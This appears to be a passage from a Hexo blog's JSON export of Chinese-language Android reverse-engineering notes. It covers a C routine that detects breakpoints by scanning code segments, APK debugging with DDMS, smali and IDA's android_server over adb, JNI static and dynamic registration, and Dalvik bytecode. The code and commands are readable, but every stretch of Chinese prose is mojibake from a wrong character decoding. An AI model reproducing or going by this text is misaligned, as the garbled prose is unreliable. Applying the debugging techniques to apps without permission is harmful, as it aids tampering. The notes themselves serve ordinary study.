æ–­ç‚¹ï¼Œè¿›è€Œåˆ¤æ–­æ˜¯å¦å¤„äºdebugã€‚Expï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041jint anti_breakpoint()&#123; Elf32_Ehdr *elfhdr; Elf32_Phdr *pht; unsigned int size, base, offset,phtable; int n, i,j; char *p; //ä»mapsä¸­è¯»å–elfæ–‡ä»¶åœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€ base = GetLibAddr(); if(base == 0)&#123; LOGD(&quot;find base error/n&quot;); return 0; &#125; elfhdr = (Elf32_Ehdr *) base; phtable = elfhdr-&gt;e_phoff + base; for(i=0;i&lt;elfhdr-&gt;e_phnum;i++)&#123; pht = (Elf32_Phdr*)(phtable+i*sizeof(Elf32_Phdr)); if(pht-&gt;p_flags&amp;1)&#123; offset = pht-&gt;p_vaddr + base + sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr)*elfhdr-&gt;e_phnum; LOGD(&quot;offset:%#x ,len:%#x&quot;,offset,pht-&gt;p_memsz); p = (char*)offset; size = pht-&gt;p_memsz; for(j=0,n=0;j&lt;size;++j,++p)&#123; if(*p == 0x10 &amp;&amp; *(p+1) == 0xde)&#123; n++; LOGD(&quot;### find thumb bpt %#x /n&quot;,p); return 1; &#125;else if(*p == 0xf0 &amp;&amp; *(p+1) == 0xf7 &amp;&amp; *(p+2) == 0x00 &amp;&amp; *(p+3) == 0xa0)&#123; n++; LOGD(&quot;### find thumb2 bpt %#x /n&quot;,p); return 1; &#125;else if(*p == 0x01 &amp;&amp; *(p+1) == 0x00 &amp;&amp; *(p+2) == 0x9f &amp;&amp; *(p+3) == 0xef)&#123; n++; LOGD(&quot;### find arm bpt %#x /n&quot;,p); return 1; &#125; &#125; LOGD(&quot;### find breakpoint num: %d/n&quot;,n); &#125; &#125; return 0;&#125;","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"Apk åŠ¨è°ƒ","slug":"APKåŠ¨è°ƒ","date":"2021-03-01T03:03:21.000Z","updated":"2021-03-27T01:09:07.979Z","comments":true,"path":"2021/03/01/APKåŠ¨è°ƒ/","link":"","permalink":"http://example.com/2021/03/01/APK%E5%8A%A8%E8%B0%83/","excerpt":"Javaå±‚ä¸Nativeå±‚çš„åŠ¨è°ƒè°ƒè¯•ã€‚","text":"Javaå±‚ä¸Nativeå±‚çš„åŠ¨è°ƒè°ƒè¯•ã€‚ DDMS(javaå±‚)ä¸»è¦åŠŸèƒ½ æ’æ¡©-logè¾“å‡º åˆ©ç”¨AndroidKillerä¿®æ”¹apkåŒ…ï¼Œåœ¨éœ€è¦æ’æ¡©çš„ä»£ç å¤„å³é”®logè¾“å‡ºï¼Œå¡«å…¥è°ƒè¯•æ—¶éœ€è¦è¾“å‡ºçš„å­—ç¬¦ä¸²ã€‚ æ‰“åŒ…å®‰è£…åˆ°è®¾å¤‡ã€‚ ddmsä¸­æ‰¾åˆ°ç¨‹åºå¯¹åº”çš„activityï¼Œè¿‡æ»¤æ‰¾åˆ°è¾“å‡ºä¿¡æ¯ã€‚ æ ¹æ®è¾“å‡ºä¿¡æ¯çš„æ—¶é—´æˆ³æ‰¾åˆ°ä¸Šä¸‹æ–‡ï¼Œå¾—åˆ°æ–¹æ³•è°ƒç”¨å±‚æ¬¡ã€‚ æ ˆè·Ÿè¸ª-stacktrace åˆ©ç”¨AndroidKillerä¿®æ”¹apkåŒ…ï¼Œåœ¨éœ€è¦æ’æ¡©å¤„å³é”®stacktraceï¼Œå¡«å…¥è°ƒè¯•æ—¶éœ€è¦è¾“å‡ºçš„å­—ç¬¦ä¸²ã€‚ å®‰è£…æ‰“å¼€ï¼Œç”¨ddmsè¿‡æ»¤è¾“å‡ºä¿¡æ¯ã€‚ æ ¹æ®è¾“å‡ºä¿¡æ¯çš„æ—¶é—´æˆ³æ‰¾åˆ°ä¸Šä¸‹æ–‡ï¼Œè‡ªä¸‹è€Œä¸Šå¾—åˆ°æ–¹æ³•è°ƒç”¨å±‚æ¬¡ã€‚ æ–¹æ³•åˆ†æ DDMSå¤„æ‰“å¼€æ–¹æ³•åˆ†æå¹¶é™åˆ¶åˆ†æçš„æ–¹æ³•æ•°ã€‚ ç‚¹å‡»okåï¼Œç«‹å³åœ¨è®¾å¤‡ä¸Šå®ç°éœ€è¦åˆ†æçš„åŠŸèƒ½ã€‚ åŠŸèƒ½å®ç°åç«‹å³ç‚¹å‡»åœæ­¢æ–¹æ³•åˆ†æã€‚ ç­‰å¾…æ–¹æ³•åˆ†æçª—å£æ‰“å¼€ã€‚ ä»»æ„æ–¹æ³•å‡å¯é€šè¿‡ä¸‹æ‹‰é¡¹æŸ¥çœ‹ä¸Šå±‚(parents)å’Œä¸‹å±‚(Children)çš„è°ƒç”¨æ–¹æ³•ã€‚ Android Studio + Smalide(javaå±‚)è¿œç¨‹è°ƒè¯• åœ¨AndroidKillerä¸­æ‰“å¼€apkæ–‡ä»¶ï¼Œç”¨ASå¯¼å…¥è¯¥å·¥ç¨‹æ–‡ä»¶å¤¹ åœ¨smaliæ–‡ä»¶ä¸­è®¾ç½®è°ƒè¯•æ–­ç‚¹ åœ¨â€œè¿è¡Œ-ç¼–è¾‘é…ç½®â€ä¸­æ–°å»ºâ€œremoteâ€ç±»å‹é…ç½®ï¼Œè®¾ç½®å¥½è°ƒè¯•å™¨åç§°å’Œç«¯å£ è¿æ¥è®¾å¤‡ï¼Œæ‰“å¼€éœ€è¦è°ƒè¯•çš„ç¨‹åºï¼Œç”¨â€œadb shell psâ€å‘½ä»¤æ‰¾åˆ°éœ€è¦è°ƒè¯•çš„è¿›ç¨‹ ç”¨â€œadb forward tcp:10001 jdwp:3523â€å‘½ä»¤è¿œç¨‹è¿æ¥ï¼Œå…¶ä¸­â€tcp:â€åå¡«å…¥è°ƒè¯•ç«¯å£å·ï¼Œâ€jdwpâ€åå¡«å…¥éœ€è¦è°ƒè¯•è¿›ç¨‹çš„pid åœ¨å·¥å…·æ å¤„é€‰æ‹©è¿œç¨‹è°ƒè¯•é…ç½®ï¼Œç‚¹å‡»çˆ¬è™«iconè¿›è¡Œè°ƒè¯• IDA Pro(Nativeå±‚)è¿œç¨‹è°ƒè¯•å°†android_server(64) pushåˆ°è®¾å¤‡ä¸­ï¼Œchmodèµ‹äºˆæƒé™å¹¶è¿è¡Œã€‚ åœ¨terminalä¸­ç”¨adbè¿›è¡Œç«¯å£è½¬å‘ã€‚é»˜è®¤ç«¯å£23946ã€‚ åˆ©ç”¨å‘½ä»¤ä½¿ç¨‹åºæŒ‚èµ·ï¼Œæ­¤æ—¶å¯åœ¨è®¾å¤‡ä¸­çœ‹è§â€œWarnningâ€çª—å£ã€‚ adb shell am start -D -n åŒ…å/åŒ…å+ç±»å æ‰“å¼€ddmså¯ä»¥å‘ç°è¢«æŒ‚èµ·çš„è¿›ç¨‹åä¹‹å‰å‡ºç°çº¢è™«è™«ã€‚ æ‰“å¼€IDAè¿›è¡Œattachï¼Œé€‰æ‹©è¿›ç¨‹ï¼Œè¿›å…¥è°ƒè¯•çª—å£ã€‚ å‹¾é€‰ä¸‰ä¸ªè°ƒè¯•å™¨é€‰é¡¹ï¼ˆç¨‹åºå…¥å£ç‚¹ï¼Œçº¿ç¨‹å¯åŠ¨ç»ˆæ­¢ï¼Œåº“åŠ è½½å¸è½½ï¼‰ï¼ŒF9è¿è¡Œï¼Œæ­¤æ—¶æ ‡é¢˜æ˜¾ç¤ºâ€œrunningâ€ã€‚ é‡Šæ”¾ç¨‹åºï¼Œæ­¤æ—¶åœ¨ddmsä¸­å‘ç°çº¢è™«è™«å˜ç»¿è™«è™«ï¼Œæ­¤æ—¶ç¨‹åºä¸­çš„æç¤ºçª—å£æ¶ˆå¤±ï¼Œç¨‹åºæ­£å¸¸è¿è¡Œã€‚ åœ¨IDAçš„æ¨¡å—çª—å£æœç´¢ï¼Œè‹¥æœªå‘ç°ç›®æ ‡åº“åˆ™ç»§ç»­è¿è¡Œï¼Œéšåå³å¯å‘ç°ç›®æ ‡åº“è¢«åŠ è½½åˆ°IDAï¼Œå¼€å§‹è°ƒè¯•ã€‚ Command Listï¼š 1234./data/user/tmp/asadb forward tcp:23946 tcp:23946adb shell am start -D -n åŒ…å/åŒ…å+ç±»åjdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=pid","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"NDKå¼€å‘","slug":"NDKå¼€å‘","date":"2021-02-27T07:31:21.000Z","updated":"2021-03-25T02:49:22.105Z","comments":true,"path":"2021/02/27/NDKå¼€å‘/","link":"","permalink":"http://example.com/2021/02/27/NDK%E5%BC%80%E5%8F%91/","excerpt":"ç”¨C/C++å¼€å‘Android","text":"ç”¨C/C++å¼€å‘Android Androidå·¥ç¨‹ä¸€èˆ¬ç”±javaè¯­è¨€ç¼–å†™ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡NDKè°ƒç”¨nativeæ–¹æ³•æ¥æ‰§è¡ŒC/C++çš„ä»£ç ï¼Œåè€…ä»£ç ä¸­çš„æ ‡è¯†ç¬¦éœ€è¦åœ¨å·¥ç¨‹ä¸­è¿›è¡Œæ³¨å†Œï¼Œä»¥ä¾¿åœ¨javaè¢«ä¸€ä¸€å¯¹åº”åœ°æ‰¾åˆ°å¹¶æ­£ç¡®è°ƒç”¨ã€‚ä¸‹é¢ä»‹ç»å…³äºnativeæ–¹æ³•çš„å¼€å‘è¿‡ç¨‹ã€‚ å¼€å‘æµç¨‹ç¼–å†™.javaåœ¨javaæ–‡ä»¶ä¸­å£°æ˜éœ€è¦ç”¨åˆ°çš„nativeå‡½æ•°ï¼Œæ— éœ€ç¼–å†™æ–¹æ³•ä½“ã€‚ å£°æ˜åæ’å…¥å¦‚ä¸‹ä»£ç ï¼Œä»¥ä¾¿è¿è¡Œæ—¶åŠ è½½nativeåº“ã€‚ 123static&#123; System.loadLibrary(&quot;strjni&quot;); &#125; ç”Ÿæˆ.håœ¨srcæ–‡ä»¶å¤¹è¿è¡Œå‘½ä»¤ 1javah -jni com.example.ndktest.MainActivity åœ¨å·¥ç¨‹ç›®å½•æ–°å»ºæ–‡ä»¶å¤¹â€jniâ€ï¼Œå°†srcæ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆçš„.hé‡å‘½ååç§»åŠ¨åˆ°æ­¤å¤„ã€‚ ç¼–å†™mkæ–‡ä»¶åœ¨jniæ–‡ä»¶å¤¹æ–°å»ºä¸¤ä¸ªmakefileæ–‡ä»¶ï¼Œæ­¤ç±»æ–‡ä»¶ç”¨äºæè¿°ç¼–è¯‘çš„ç›¸å…³é…ç½®ã€‚æ–‡ä»¶ååŠå†…å®¹å¦‚ä¸‹ï¼š 1234567891011#Android.mkLOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) LOCAL_MODULE := strjni #æ¨¡å—åç§° LOCAL_SRC_FILES := strjni.c #æºæ–‡ä»¶ .cæˆ–è€….cppLOCAL_ARM_MODE := arm #ç¼–è¯‘åçš„æŒ‡ä»¤é›† ARMæŒ‡ä»¤LOCAL_LDLIBS += -llog #ä¾èµ–åº“ include $(BUILD_SHARED_LIBRARY) #æŒ‡å®šç¼–è¯‘æ–‡ä»¶çš„ç±»å‹#Application.mkAPP_ABI := armeabi-v7a ç¼–å†™.cï¼Œç¼–è¯‘æ ¹æ®.hä¸­çš„å£°æ˜ï¼Œåœ¨.cæ–‡ä»¶ä¸­ç¼–å†™nativeå‡½æ•°çš„å‡½æ•°ä½“ã€‚è¯¦ç»†ç¼–å†™åˆ†ä¸ºé™æ€æ³¨å†Œä¸åŠ¨æ€æ³¨å†Œã€‚ åœ¨jniç›®å½•ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1ndk-build è¿è¡Œè°ƒè¯•æ„å»ºå·¥ç¨‹ï¼Œè¿æ¥AVDå¹¶ä¸”è¿è¡Œè°ƒè¯•ã€‚ é™æ€æ³¨å†Œé€šè¿‡ JNIEXPORT å’Œ JNICALL ä¸¤ä¸ªå®å®šä¹‰å£°æ˜ï¼Œç¨‹åºåŠ è½½soæ—¶ä¼šæ ¹æ®ä¸Šé¢çš„å®å®šä¹‰å£°æ˜é“¾æ¥åˆ°å¯¹åº”çš„nativeå‡½æ•°ã€‚ Expï¼šåœ¨Java codeä¸­å£°æ˜å¦‚ä¸‹å‡½æ•°ï¼š 123public native String get_str();public native String get_strstatic_str();public native String get_string_from_c(); ç”¨ javah -jni åŒ…å+ç±»åå‘½ä»¤ç”Ÿæˆå¦‚ä¸‹.hæ–‡ä»¶ï¼š 1234567891011121314151617181920212223242526272829303132333435#include &lt;jni.h&gt;#ifndef _Included_com_example_jinstudy_MainActivity#define _Included_com_example_jinstudy_MainActivity#ifdef __cplusplusextern &quot;C&quot; &#123;#endif/* * Class: com_example_jinstudy_MainActivity * Method: get_str * Signature: ()Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str (JNIEnv *, jobject);/* * Class: com_example_jinstudy_MainActivity * Method: get_strstatic_str * Signature: ()Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_strstatic_str (JNIEnv *, jobject);/* * Class: com_example_jinstudy_MainActivity * Method: get_string_from_c * Signature: ()Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_string_from_c (JNIEnv *, jobject);#ifdef __cplusplus&#125;#endif#endif æˆ‘ä»¬å‘ç°åŸæœ¬Javaä¸­çš„Stringç±»å‹ï¼Œå˜æˆäº†Cä¸­çš„jstringç±»å‹ï¼Œè¿™æ˜¯ä¸¤ç§è¯­è¨€åœ¨æ•°æ®ç»“æ„ä¸Šçš„æ˜ å°„ã€‚è¯¦ç»†å¯¹åº”æƒ…å†µå¦‚ä¸‹ï¼š å¼•å…¥ä¸Šè¿°.hï¼Œç¼–å†™å¦‚ä¸‹.cæ–‡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637#include &lt;JNIstudy.h&gt;JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str_from_c (JNIEnv *env, jobject obj)&#123; //ç±»å‹è½¬æ¢ NewStringUTF(envï¼Œå­—ç¬¦ä¸²) jstring str= (*env)-&gt;NewStringUTF(env, &quot;Test&quot;); return str;&#125;//è°ƒç”¨javaå±‚æ™®é€šå­—æ®µJNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str (JNIEnv *env, jobject obj)&#123; //1.è·å–ç±» //FindClass:ç¬¬ä¸€ä¸ªenvï¼Œç¬¬äºŒä¸ªï¼šå­—æ®µæ‰€åœ¨ç±»çš„è·¯å¾„ï¼ˆç‚¹æ¢æˆæ–œæ ï¼‰ jclass _jclass = (*env)-&gt;FindClass(env,&quot;com/example/jinstudy/MainActivity&quot;); //2.è·å–å­—æ®µID //GetFieldID:ç¬¬ä¸€ä¸ªenvï¼Œç¬¬äºŒä¸ªFindClassçš„è¿”å›å€¼ï¼Œç¬¬ä¸‰ä¸ªjavaå±‚å­—æ®µçš„åç§°ï¼Œç¬¬å››ä¸ªjavaå±‚å­—æ®µçš„ç­¾å jfieldID _jfieldID = (*env)-&gt;GetFieldID(env, _jclass, &quot;ZD&quot;, &quot;Ljava/lang/String;&quot;); //3.è·å–å­—æ®µ //GetObjectField:ç¬¬ä¸€ä¸ªenvï¼Œç¬¬äºŒä¸ªobjï¼Œç¬¬ä¸‰ä¸ªGetFieldIDçš„è¿”å›å€¼ jobject str= (*env)-&gt;GetObjectField(env, obj, _jfieldID); return str;&#125;//è°ƒç”¨javaå±‚é™æ€å­—æ®µJNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_static_str (JNIEnv *env, jobject obj)&#123; //1.è·å–ç±»ï¼šFindClassï¼ˆï¼‰ jclass _jclass = (*env)-&gt;FindClass(env,&quot;com/example/jinstudy/MainActivity&quot;); //2.è·å–é™æ€å­—æ®µID jfieldID _jfieldID= (*env)-&gt;GetStaticFieldID(env, _jclass, &quot;ZD1&quot;,&quot;Ljava/lang/String;&quot;); //3.è·å–é™æ€å­—æ®µ //GetStaticObjectField:ç¬¬ä¸€ä¸ªenvï¼Œç¬¬äºŒä¸ªæ˜¯ç±»,æ—¢FindClassçš„è¿”å›å€¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°GetStaticFieldIDçš„è¿”å›å€¼ jobject str= (*env)-&gt;GetStaticObjectField(env, _jclass, _jfieldID); return str;&#125; éœ€è¦æ³¨æ„çš„æ˜¯ï¼š é€šå¸¸åœ¨æˆ‘ä»¬ç¼–å†™nativeå‡½æ•°æ—¶ï¼Œæ­¤ç±»å‡½æ•°éƒ½ä¼šè‡ªå¸¦ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¸ºJNIEnv *å’Œjobjectï¼Œç´§æ¥ç€æ‰æ˜¯è¯¥å‡½æ•°åœ¨Javaå±‚ä¸­å£°æ˜çš„å‚æ•°åˆ—è¡¨ã€‚ æˆ‘ä»¬é€šå¸¸éœ€è¦è¿”å›ä¸€ä¸ªjobjectç±»å‹çš„å¯¹è±¡ï¼Œè¿™å°±éœ€è¦ç”¨åˆ°GetStaticObjectFieldæ–¹æ³•ï¼Œå…¶å‚æ•°åˆ†åˆ«æ˜¯JNIEnv*,jclass,jfiledIDã€‚è¿™é‡Œçš„JNIEnvä»¥åŠæœ¬èŠ‚ä¸­åæ–‡çš„JNIEnvå‡å’Œnativeå‡½æ•°ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€æ ·çš„ã€‚ jfiledIDå¯¹è±¡å°†Javaå±‚çš„å­—æ®µç±»å‹æ˜ å°„åˆ°Cä¸­ï¼Œå…¶éœ€è¦é€šè¿‡GetStaticFieldIDæ–¹æ³•è·å–ï¼Œè€Œæ­¤æ–¹æ³•çš„å‚æ•°ä¸ºJNIEnv*,jclass,string,stringã€‚stringç±»å‹çš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¼ å…¥çš„æ˜¯å­—æ®µåœ¨Javaå±‚ä¸­çš„åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°åˆ™æ˜¯è¯¥å‚æ•°çš„å®Œæ•´ç±»å‹åç§°å¹¶ä»¥â€™;â€™ç»“å°¾ã€‚ jclassåˆ™éœ€è¦ä½¿ç”¨FindClassæ–¹æ³•è·å–ï¼Œå…¶å‚æ•°ä¸ºJNIEnv*ï¼Œstringã€‚stringç±»å‹å‚æ•°éœ€è¦ä¼ å…¥çš„æ˜¯å‡½æ•°æ‰€åœ¨ç±»çš„è·¯å¾„åï¼Œå¯ä»¥ç†è§£æˆå°†â€™.â€™æ›¿æ¢æˆâ€™/â€˜çš„åŒ…å+ç±»åã€‚ å…¶å®é™æ€æ³¨å†Œçš„ä»£ç ç¼–å†™çš„è¦ç‚¹å°±æ˜¯ï¼Œéœ€è¦çš„è·å–ä»€ä¹ˆæ ·çš„ç±»å‹ï¼Œå°±åœ¨jni.hä¸­å¯»æ‰¾èƒ½è¿”å›è¯¥ç±»å‹çš„å¯¹åº”æ–¹æ³•ï¼Œå†è¡¥å…¨æ­¤æ–¹æ³•çš„å‚æ•°ã€‚æœ¬è´¨æ˜¯ä¸€ä¸ªé€’å½’è¡¥å…¨å‚æ•°çš„è¿‡ç¨‹ğŸ˜‚ã€‚ åŠ¨æ€æ³¨å†Œé€šè¿‡ RegisterNativeså‡½æ•°ç”±ç¼–ç¨‹è€…å®Œæˆ nativeå‡½æ•°ä¸soä¸­å‡½æ•°çš„ç»‘å®šï¼Œä½¿å¾—ç¨‹åºå¯ä»¥é€šè¿‡è¿™ä¸ªæ˜ å°„è¡¨æ‰¾åˆ°ç›¸åº”çš„å‡½æ•°äº†ã€‚ Exp:åœ¨Java codeä¸­å£°æ˜å¦‚ä¸‹åŠ å‡ä¹˜é™¤å‡½æ•°: 1234public native double add(double number1,double number2); public native double sub(double number1,double number2); public native double mul(double number1,double number2); public native double div(double number1,double number2); å¼•å…¥jni.håç›´æ¥ç¼–å†™å¯¹åº”çš„.cæ–‡ä»¶ï¼š 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;jni.h&gt;jdouble addc(JNIEnv *env, jobject obj, jdouble a, jdouble b)&#123; return a+b;&#125;jdouble subc(JNIEnv *env, jobject obj, jdouble a, jdouble b)&#123; return a-b;&#125;jdouble mulc(JNIEnv *env, jobject obj, jdouble a, jdouble b)&#123; return a*b;&#125;jdouble divc(JNIEnv *env, jobject obj, jdouble a, jdouble b)&#123; return a/b;&#125;//å£°æ˜nativeæ–¹æ³•ç»“æ„ä½“JNINativeMethod nm[]=&#123; //å‚æ•°ï¼šéœ€ç»‘å®šçš„javaå±‚å‡½æ•°å,å‚æ•°è¿”å›å€¼ç±»å‹,éœ€ç»‘å®šçš„nativeå‡½æ•°æŒ‡é’ˆ &#123;&quot;add&quot;,&quot;(DD)D&quot;,(void*)addc&#125;, &#123;&quot;sub&quot;,&quot;(DD)D&quot;,(void*)subc&#125;, &#123;&quot;mul&quot;,&quot;(DD)D&quot;,(void*)mulc&#125;, &#123;&quot;div&quot;,&quot;(DD)D&quot;,(void*)divc&#125;&#125;;//åŠ¨æ€æ³¨å†ŒJNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved)&#123; JNIEnv* env; if( (*vm)-&gt;GetEnv(vm, (void**)&amp;env, JNI_VERSION_1_4)!=JNI_OK)&#123; return JNI_ERR; &#125; jclass jc = (*env)-&gt;FindClass(env,&quot;com/example/calcu/MainActivity&quot;); if((*env)-&gt;RegisterNatives(env, jc, nm,sizeof(nm)/sizeof(nm[0]))!=JNI_OK)&#123; return JNI_ERR; &#125; //å›ºå®šè¿”å›å€¼ return JNI_VERSION_1_4;&#125; éœ€è¦æ³¨æ„ï¼š ç¼–å†™å‡½æ•°ä½“çš„è¿‡ç¨‹å’Œé™æ€æ³¨å†Œå·®å¼‚ä¸å¤§ ç”±äºæ²¡æœ‰ç”Ÿæˆ.hæ–‡ä»¶å¯¹å‡½æ•°è¿›è¡Œå£°æ˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†æ‰€æœ‰å‡½æ•°æ•´åˆä¸ºä¸€ä¸ªJNINativeMethodç±»å‹çš„ç»“æ„ä½“ã€‚å…¶å±æ€§åˆ†åˆ«ä¸ºå‡½æ•°å†Javaå±‚ä¸­çš„å­—æ®µå(string)ï¼Œå‚æ•°å’Œè¿”å›å€¼ç±»å‹(string)ï¼Œå…¶ä¸­å‚æ•°å†™åœ¨æ‹¬å·å†…ï¼Œè¿”å›å€¼å†™åœ¨æ‹¬å·å¤–ï¼Œæœ€åä¸€ä¸ªå‚æ•°æ˜¯Nativeæ–¹æ³•çš„å‡½æ•°æŒ‡é’ˆ(void *)ã€‚ å¯¹ä¸Šè¿°ç»“æ„ä½“ç”¨RegisterNativesæ–¹æ³•è¿›è¡Œæ³¨å†Œï¼Œè¡¥å…¨ç›¸åº”çš„å‚æ•°åï¼Œå†™å…¥JNI_OnLoadå‡½æ•°ä½“ä¸­ï¼Œè¯¥å‡½æ•°æ˜¯åŠ¨æ€æ³¨å†Œæ˜¯Nativeæ–¹æ³•çš„å…¥å£ã€‚","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"Dalvikå­—èŠ‚ç ","slug":"Dalvikå­—èŠ‚ç ","date":"2021-02-21T08:24:28.000Z","updated":"2021-03-25T02:49:10.397Z","comments":true,"path":"2021/02/21/Dalvikå­—èŠ‚ç /","link":"","permalink":"http://example.com/2021/02/21/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/","excerpt":"çœ‹æ‡‚Dalvikå­—èŠ‚ç ï¼Œçœ‹æ‡‚Smaliæ–‡ä»¶ã€‚","text":"çœ‹æ‡‚Dalvikå­—èŠ‚ç ï¼Œçœ‹æ‡‚Smaliæ–‡ä»¶ã€‚ å¯„å­˜å™¨å­˜å‚¨å˜é‡â‰¤32ä½ï¼Œç”¨1ä¸ªå¯„å­˜å™¨ å­˜å‚¨å˜é‡64ä½ï¼Œç”¨2ä¸ªç›¸é‚»å¯„å­˜å™¨ å¯„å­˜å™¨å‘½åæ³•vå‘½åæ³•å±€éƒ¨å˜é‡ï¼šMä¸ª ä½¿ç”¨å¯„å­˜å™¨ï¼šv0~vM-1 ä¼ å…¥å‚æ•°ï¼šNä¸ª ä½¿ç”¨å¯„å­˜å™¨ï¼švM~vM+N-1 på‘½åæ³•å±€éƒ¨å˜é‡ï¼šMä¸ª ä½¿ç”¨å¯„å­˜å™¨ï¼šv0~vM-1 ä¼ å…¥å‚æ•°ï¼šNä¸ª ä½¿ç”¨å¯„å­˜å™¨ï¼šp0~pN-1 smaliæ•°æ®ç±»å‹ å­—æ®µä¸å‡½æ•°åˆ†æå­—æ®µæ ¼å¼1Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String; åˆ†æä¸ºjavaï¼š 1234package Lpackage.nameclass ObjectName&#123; String FieldName;&#125; å‡½æ•°æ ¼å¼1Lpackage/name/ObjectName;-&gt;MethodName(III)Z åˆ†æä¸ºjavaï¼š 1234567package Lpackage.nameclass ObjectName&#123; public Boolean MethodName(int ,int ,int ) &#123; return true; &#125;&#125; DalvikæŒ‡ä»¤æ ¼å¼ æ ¼å¼ï¼šåŸºç¡€å­—èŠ‚ç -åç§°åç¼€/å­—èŠ‚ç åç¼€ ç›®çš„å¯„å­˜å™¨ æºå¯„å­˜å™¨ expï¼š move - wide / from16 vAA , vBBBB å…¶ä¸­moveä¸ºåŸºç¡€å­—èŠ‚ç ï¼Œopcode wideä¸ºåç§°åç¼€,æ ‡è¯†æŒ‡ä»¤æ“ä½œçš„æ•°æ®å®½åº¦ä¸º64ä½ã€‚ from16ä¸ºå­—èŠ‚ç åç¼€,æ ‡è¯†æºä¸ºä¸€ä¸ª16ä½çš„å¯„å­˜å™¨å¼•ç”¨å˜é‡ vAAä¸ºç›®çš„å¯„å­˜å™¨,å®ƒå§‹ç»ˆåœ¨æºçš„å‰é¢ï¼Œå–å€¼èŒƒå›´ä¸ºv0~v255 vBBBBä¸ºæºå¯„å­˜å™¨ï¼Œå–å€¼èŒƒå›´ä¸ºv0~v65535","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"AndroidåŸºç¡€","slug":"AndroidåŸºç¡€","date":"2021-02-12T12:14:08.000Z","updated":"2021-03-25T02:49:01.125Z","comments":true,"path":"2021/02/12/AndroidåŸºç¡€/","link":"","permalink":"http://example.com/2021/02/12/Android%E5%9F%BA%E7%A1%80/","excerpt":"è¡¥å……ä¸€äº›å…³äºAndroidçš„ç³»ç»ŸçŸ¥è¯†ã€‚","text":"è¡¥å……ä¸€äº›å…³äºAndroidçš„ç³»ç»ŸçŸ¥è¯†ã€‚ APKåŒ…ç»“æ„ Filename Property assets é™æ€èµ„æºï¼ˆå›¾ç‰‡ï¼Œé…ç½®æ–‡ä»¶ï¼Œhtml5ç¦»çº¿èµ„æºï¼‰ä»»æ„æ·±åº¦å­ç›®å½• res ç¨‹åºèµ„æºï¼ˆå›¾ç‰‡ï¼Œå›¾æ ‡ï¼Œå­—ç¬¦ä¸²ï¼‰æ‹¥æœ‰å¯¹åº”èµ„æºidï¼Œå…³è”ä»£ç R.java lib ä¾èµ–åº“ï¼ˆå½“å‰appç”¨åˆ°çš„soï¼‰ META-INF è¯ä¹¦ç­¾åæ–‡ä»¶ .dex å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆæ–¹æ³•æ•°&gt;2Â¹â¶æ—¶åˆ†åŒ…ï¼‰ AndroidManifest.xml é¡¹ç›®çš„ç³»ç»Ÿæ¸…å•ï¼ˆé…ç½®ã€å››å¤§ç»„ä»¶çš„å£°æ˜ï¼‰ resources.arsc èµ„æºç´¢å¼•è¡¨ Androidæ‰“åŒ…æµç¨‹ 1.èµ„æºâ†’æºç  2.æ¥å£â†’æºç  3.æºç â†’å­—èŠ‚ç  4.å­—èŠ‚ç â†’å¯æ‰§è¡Œ 5.å¯æ‰§è¡Œâ†’apk 6.apkç­¾å 7.apkå¯¹é½å‹ç¼© APKå®‰è£…æµç¨‹ 1.åœ¨/data/appåˆ›å»ºä»¥apkåŒ…åå‘½åçš„æ–‡ä»¶å¤¹ï¼Œå¹¶å°†apkè§£å‹è‡³æ­¤ 2.åœ¨/data/dataåˆ›å»ºä»¥apkåŒ…åå‘½åçš„æ–‡ä»¶å¤¹ï¼Œè§£æAndroidManifest.xmlå¹¶ä¸Šè¿°æ–‡ä»¶å¤¹å†™å…¥åº”ç”¨æ•°æ® 3.ä¼˜åŒ–dexæ–‡ä»¶ï¼Œä¿å­˜äºâ€/data/dalvik-cache/profiles/â€œ+apkåŒ…å è™šæ‹Ÿæœº ç±»å‹ è¿è¡Œ æœºåˆ¶ ç‰¹ç‚¹ javaè™šæ‹Ÿæœº Javaå­—èŠ‚ç (.class) ç•¥ åŸºäºæ ˆæ¶æ„ Dalvikè™šæ‹Ÿæœº DEXå­—èŠ‚ç ï¼ˆ.odexï¼‰ jitç¼–è¯‘æœºåˆ¶ 